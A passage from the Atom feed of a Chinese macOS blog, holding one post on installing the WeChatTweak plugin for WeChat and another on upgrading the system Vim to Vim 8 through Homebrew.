    <link href="http://lfoder.github.io/2018/07/01/MacOS%E4%B8%8A%E5%BE%AE%E4%BF%A1%E5%A4%9A%E5%BC%80%E6%8F%92%E4%BB%B6WeChatTweak-%E5%85%8D%E9%AA%8C%E8%AF%81%E7%99%BB%E5%BD%95-%E6%B6%88%E6%81%AF%E9%98%B2%E6%92%A4%E5%9B%9E/"/>
    <id>http://lfoder.github.io/2018/07/01/MacOS上微信多开插件WeChatTweak-免验证登录-消息防撤回/</id>
    <published>2018-07-01T01:05:46.000Z</published>
    <updated>2018-07-02T00:27:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>话不投机半句多   直入主题</p><p>具体介绍 <a href="https://www.baidu.com/s?wd=WeChatTweak" target="_blank" rel="noopener">自行百度</a></p><p><img src="https://github.com/Sunnyyoung/WeChatTweak-macOS/raw/master/Screenshot/0x01.png" alt=""></p><h3 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h3><p><a href="https://tweaks.app/" target="_blank" rel="noopener">https://tweaks.app</a></p><h3 id="下载插件"><a href="#下载插件" class="headerlink" title="下载插件"></a>下载插件</h3><p>终端执行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Sunnyyoung/WeChatTweak-macOS.git</span><br></pre></td></tr></table></figure><p>进入目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd WeChatTweak-macOS</span><br></pre></td></tr></table></figure><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make unstall</span><br></pre></td></tr></table></figure><p>安装好后，重启微信客户端即可生效。</p><h3 id="知识库"><a href="#知识库" class="headerlink" title="知识库"></a>知识库</h3><p>具体安装过程，看作者文档</p><p><a href="https://github.com/Sunnyyoung/WeChatTweak-macOS/wiki" target="_blank" rel="noopener">https://github.com/Sunnyyoung/WeChatTweak-macOS/wiki</a></p>]]></content>
    
    <summary type="html">
    
      利用macOS的开放性，可以实现通过安装插件的方式，使微信多开以及一些增益功能的实现，包括免验证登录，消息防撤回，该插件目前仅限于MacOS使用。
    
    </summary>
    
      <category term="MacOS 笔记" scheme="http://lfoder.github.io/categories/MacOS-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="消息防撤回" scheme="http://lfoder.github.io/tags/%E6%B6%88%E6%81%AF%E9%98%B2%E6%92%A4%E5%9B%9E/"/>
    
      <category term="微信多开" scheme="http://lfoder.github.io/tags/%E5%BE%AE%E4%BF%A1%E5%A4%9A%E5%BC%80/"/>
    
      <category term="免验证登录" scheme="http://lfoder.github.io/tags/%E5%85%8D%E9%AA%8C%E8%AF%81%E7%99%BB%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>MacOS升级自带Vim7.4到Vim8.0</title>
    <link href="http://lfoder.github.io/2018/06/28/MacOS%E5%8D%87%E7%BA%A7%E8%87%AA%E5%B8%A6Vim7-4%E5%88%B0Vim8-0/"/>
    <id>http://lfoder.github.io/2018/06/28/MacOS升级自带Vim7-4到Vim8-0/</id>
    <published>2018-06-28T02:22:30.000Z</published>
    <updated>2018-06-28T02:40:41.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="升级MacOS系统自带的Vim到Vim8-0"><a href="#升级MacOS系统自带的Vim到Vim8-0" class="headerlink" title="升级MacOS系统自带的Vim到Vim8.0"></a>升级MacOS系统自带的Vim到Vim8.0</h2><h3 id="安装Vim-8-0"><a href="#安装Vim-8-0" class="headerlink" title="安装Vim 8.0"></a>安装Vim 8.0</h3><p>根据个人喜好 选择安装</p><p>终端Vim：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install vim --with-lua --with-override-system-vi</span><br></pre></td></tr></table></figure><p>Gui版Vim：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install macvim --with-lua --with-override-system-vim</span><br></pre></td></tr></table></figure><p>安装完后vim8.0 会安装在 <code>/usr/local/Cellar/vim/8.1.0100_1</code> ,后面版本号因人而异。</p><p>Vim8.0的执行程序在 <code>/usr/local/Cellar/vim/8.1.0100_1/bin</code></p><p>我这安装了 <code>zsh</code>  ,(你可以在 <a href="/2018/06/19/全新MacOS系统零基础配置到使用全过程/#oh-my-zsh-终端便捷操作工具">zsh安装方法</a> 中查看如何安装zsh)，所以 我修改环境变量的位置是 <code>~/.zshrc</code> ，没有安装<code>zsh</code> 则修改 <code>~/.bash_profile</code></p><p>添加 Vim 执行目录到 环境变量 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/<span class="built_in">local</span>/Cellar/vim/8.1.0100_1:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>或者:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> vim=<span class="string">'/usr/local/Cellar/vim/8.1.0100_1/bin/vim'</span></span><br></pre></td></tr></table></figure><p>然后 source 一下，使环境变量即刻生效。（没安装 zsh 的 则执行 <code>source ~/.bash_profile</code>）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure><p>安装好后很多插件需要重新编译一下，比如 <code>YouCompleteMe</code></p><p>重新编译一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.vim/bundle/YouCompleteMe</span><br><span class="line"><span class="comment"># 平时用python与nodejs比较多的人，可以选择对应后面的两个参数，第一个需要安装xcode，第二个需要安装node与npm</span></span><br><span class="line">./install.py --clang-completer --tern-completer</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>输入 <code>mvim</code> 可以<strong>从终端启动 GUI 版的 Vim</strong>。</p><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p><strong>更新 vim 或者 macvim 到最新版</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew upgrade vim/macvim</span><br></pre></td></tr></table></figure><p><strong>添加 python3 的支持</strong>？在以上命令基础上再加 <code>—with-python3</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;升级MacOS系统自带的Vim到Vim8-0&quot;&gt;&lt;a href=&quot;#升级MacOS系统自带的Vim到Vim8-0&quot; class=&quot;headerlink&quot; title=&quot;升级MacOS系统自带的Vim到Vim8.0&quot;&gt;&lt;/a&gt;升级MacOS系统自带的Vim到Vim8
      
    
    </summary>
    
      <category term="MacOS 笔记" scheme="http://lfoder.github.io/categories/MacOS-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="MacOS" scheme="http://lfoder.github.io/tags/MacOS/"/>
    
      <category term="Vim" scheme="http://lfoder.github.io/tags/Vim/"/>
    
  </entry>
  
</feed>
